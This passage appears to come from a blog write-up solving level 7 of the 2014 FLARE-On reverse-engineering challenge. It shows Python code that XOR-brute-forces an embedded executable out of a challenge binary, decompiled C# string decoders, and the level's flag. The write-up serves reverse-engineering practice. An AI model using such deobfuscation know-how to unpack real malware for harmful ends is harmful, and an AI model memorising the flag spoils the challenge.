                            out = xor(out,key14[index[14]])

                            if ( out[0]=='M' and out[1]=='Z'):
                              print "Found it"
                              print out
                              print hexlify(out)

                              out = wholefile

                              out = xor(out,key1[ind1])
                              out = xor(out,key2[ind2])
                              out = xor(out,key3[ind3])
                              out = xor(out,key4[ind4])
                              out = xor(out,key5[ind5])
                              out = xor(out,key6[ind6])
                              out = xor(out,key7[ind7])
                              out = xor(out,key8[ind8])
                              out = xor(out,key9[ind9])
                              out = xor(out,key10[ind10])
                              out = xor(out,key11[ind11])
                              out = xor(out,key13[ind13])
                              out = xor(out,key14[ind14])
                              out = xor(out,'backdoge.exe')

                              decodedfilename = "c:\\gratz" + str(counter) + ".exe"
                              decodedfile = file(decodedfilename,'wb')
                              decodedfile.write(out)
                              decodedfile.close()

                            # be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  
                            out = wholefile[:0x10]
                            counter +=1

{{< /codecaption >}}

It's a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first ``0x80`` bytes of the binary which is the ``DOS Stub``. In the end, it compares the first two bytes with ``MZ`` and then xor-es the whole binary before writing it to a file.

I got two files and after opening them in hex editors, one was clearly a false positive. I executed the correct binary.

![Almost done](/images/2014/flare/7-23.jpg "Almost done")

But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.

{{< codecaption lang="c#" title="Decompiled gratz.exe" >}}
public Form1()
{
  this.InitializeComponent();
  new Thread(new ThreadStart(this.lulzors)).Start();
}

public void lulzors()
{
  lulz lulz = new lulz();
  Thread thread = new Thread(new ThreadStart(lulz.datwork));
  thread.Start();
  do
    ;
  while (thread.IsAlive);
  this.label2.Text = lulz.decoder4("\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005");
}

{{< /codecaption >}}

And inside ``lulz.cs``.

{{< codecaption lang="c#" title="lulz.cs" >}}
// decoder1 and decoder3 omitted

public string decoder2(string encoded)
{
  string str1 = "";
  string str2 = "this";
  for (int index = 0; index < encoded.Length; ++index)
    str1 = str1 + (object) (char) ((uint) encoded[index] ^ (uint) str2[index % str2.Length]);
  return str1;
}

public string decoder4(string encoded)
{
  string str1 = "";
  string str2 = this.decoder2("\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K");
  for (int index = 0; index < encoded.Length; ++index)
    str1 = str1 + (object) (char) ((uint) encoded[index] ^ (uint) str2[index % str2.Length]);
  return str1;
}

{{< /codecaption >}}

We can either write code or paste it into an online C# compiler. In the end we have the flag:

#### Level 7 flag: da7.f1are.finish.lin3@flare-on.com

And the email:

```
Alright, we give in. You've done it. Your reversing-fu is strong.
I'll pass your info on to the FLARE team and someone will be in touch.
-FLARE
```
